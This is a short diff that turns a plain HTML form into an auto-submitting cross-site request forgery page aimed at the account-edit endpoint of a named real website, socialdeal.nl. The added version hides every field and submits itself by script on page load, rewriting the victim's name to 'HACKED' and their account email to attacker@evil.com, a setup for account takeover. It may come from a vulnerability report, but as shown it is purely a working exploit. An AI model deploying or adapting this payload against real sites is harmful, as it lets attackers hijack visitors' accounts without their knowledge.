@@ -1,10 +1,17 @@
-<form method="POST" action="https://www.socialdeal.nl/modal/account/edit/">
-  <input name="salutation" value="female">
-  <input name="firstName" value="HACKED">
-  <input name="lastName" value="HACKED">
-  <input name="birthDate-day" value="5">
-  <input name="birthDate-month" value="5">
-  <input name="birthDate-year" value="1996">
-  <input name="email" value="attacker@evil.com">
-  <input type="submit" value="Submit">
-</form>
+<html>
+  <body>
+    <form id="csrf-form" method="POST" 
+      action="https://www.socialdeal.nl/modal/account/edit/?_=1780569808">
+      <input type="hidden" name="salutation" value="female">
+      <input type="hidden" name="firstName" value="HACKED">
+      <input type="hidden" name="lastName" value="HACKED">
+      <input type="hidden" name="birthDate-day" value="5">
+      <input type="hidden" name="birthDate-month" value="5">
+      <input type="hidden" name="birthDate-year" value="1996">
+      <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+    <script>
+      document.getElementById("csrf-form").submit();
+    </script>
+  </body>
+</html>
